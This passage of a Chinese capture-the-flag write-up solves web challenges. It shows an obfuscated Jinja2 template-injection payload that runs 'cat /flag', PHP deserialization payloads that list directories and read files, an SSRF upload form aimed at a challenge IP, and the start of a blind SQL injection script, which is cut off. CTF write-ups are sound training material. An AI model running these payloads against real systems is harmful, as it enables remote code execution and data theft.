class="name"><span class="keyword">set</span></span> xhx = bfhc%((nine~five)|int) %&#125;</span><span class="xml">    # 使用%c构造下划线 _</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> right = bfhc%((four~one)|int) %&#125;</span><span class="xml">    # 使用%c构造右括号 )</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> left = bfhc%((four~zero)|int) %&#125;</span><span class="xml">    # 使用%c构造左括号 (</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> but = dict(buil=aa,tins=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # builtins</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> imp = dict(imp=aa,ort=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # import</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pon = dict(po=aa,pen=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # popen</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> so = dict(o=aa,s=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # os</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ca = dict(ca=aa,t=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # cat</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> flg = dict(fl=aa,ag=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # flag</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ev = dict(ev=aa,al=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # eval</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> red = dict(re=aa,ad=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # read</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bul = xhx~xhx~but~xhx~xhx %&#125;</span><span class="xml">    # __builtins__</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ini = dict(ini=aa,t=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # init</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> glo = dict(glo=aa,bals=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # globals</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> itm = dict(ite=aa,ms=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # items</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 将上面构造的字符或字符串拼接起来构造出 __import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read(): </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><span class="xml">    # globals</span></span><br><span class="line"><span class="xml">	</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> f == bul %&#125;</span><span class="xml"> </span></span><br><span class="line"><span class="xml">		</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> a,b in (v|attr(itm))() %&#125;</span><span class="xml">    # builtins</span></span><br><span class="line"><span class="xml">			</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> a == ev %&#125;</span><span class="xml">    # eval</span></span><br><span class="line"><span class="xml">				</span><span class="template-variable">&#123;&#123;b(pld)&#125;&#125;</span><span class="xml">    # eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span></span><br><span class="line"><span class="xml">			</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml">		</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br><span class="line"><span class="xml">	</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 最后的payload如下:</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> zero = (self|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> one = (zero**zero)|int %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> two = (zero-one-one)|<span class="keyword">abs</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> four = (two*two)|int %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> five = (two*two*two)-one-one-one %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> three = five-one-one %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> nine = (two*two*two*two-five-one-one) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> seven = (zero-one-one-five)|<span class="keyword">abs</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> space = self|string|min %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> point = self|float|string|min %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> c = dict(c=aa)|<span class="keyword">reverse</span>|<span class="keyword">first</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfh = self|string|urlencode|<span class="keyword">first</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfhc = bfh~c %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> slas = bfhc%((four~seven)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> yin = bfhc%((three~nine)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xhx = bfhc%((nine~five)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> right = bfhc%((four~one)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> left = bfhc%((four~zero)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> but = dict(buil=aa,tins=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> imp = dict(imp=aa,ort=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pon = dict(po=aa,pen=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> so = dict(o=aa,s=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ca = dict(ca=aa,t=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> flg = dict(fl=aa,ag=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ev = dict(ev=aa,al=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> red = dict(re=aa,ad=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bul = xhx~xhx~but~xhx~xhx %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ini = dict(ini=aa,t=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> glo = dict(glo=aa,bals=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> itm = dict(ite=aa,ms=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> f == bul %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> a,b in (v|attr(itm))() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> a == ev %&#125;</span><span class="template-variable">&#123;&#123;b(pld)&#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure>
+
+
+<p>SLP类中存在能够进行文件处理和迭代的类：</p>
+<table>
+<thead>
+<tr>
+<th align="left">类</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">DirectoryIterator</td>
+<td align="left">遍历目录</td>
+</tr>
+<tr>
+<td align="left">FilesystemIterator</td>
+<td align="left">遍历目录</td>
+</tr>
+<tr>
+<td align="left">GlobIterator</td>
+<td align="left">遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
+</tr>
+<tr>
+<td align="left">SplFileObject</td>
+<td align="left">读取文件，按行读取，多行需要遍历</td>
+</tr>
+<tr>
+<td align="left">finfo/finfo_open()</td>
+<td align="left">需要两个参数</td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//遍历php本身内置类</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其实真正用到的也就是Class A</p>
+<p><strong>payload:</strong></p>
+<p>1.遍历文件</p>
+<p>通过遍历，我们知道FilesystemIterator类有toSring方法，可以利用</p>
+<p><img src="https://img.npfs06.top/20210406225357.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$o</span>  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$o</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>2.读取flag文件</p>
+<p>通过遍历，我们知道SplFileObject类有toSring方法，可以利用</p>
+<p><img src="https://img.npfs06.top/20210406225302.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no session&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(check_inner_ip(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$url</span>)&#123;</span><br><span class="line">            <span class="variable">$ch</span> = curl_init();</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your IP is internal yoyoyo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">no session</span><br></pre></td></tr></table></figure>
+<p>要求存在session，可以利用PHP_SESSION_UPLOAD_PROGRESS设置PHPSESSID=flag</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://183.129.189.60:10015/?url=http://localhost/admin.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>随便传一个文件，同时添加Cookie即可</p>
+<p>SSRF，其中外部ip、127.0.0.1都被ban了，localhost可以，这里有个admin.php</p>
+<p><img src="https://img.npfs06.top/20210407191625.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>访问路径，下载压缩包</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//se1f_Log3n.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/db.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> !== <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; and `password`=&quot;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$con</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc() <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>)) <span class="keyword">OR</span> ( (<span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>) )); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>sql注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">127</span>:</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment"># url = &quot;http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=&#x27; or length(database())&gt;0-- 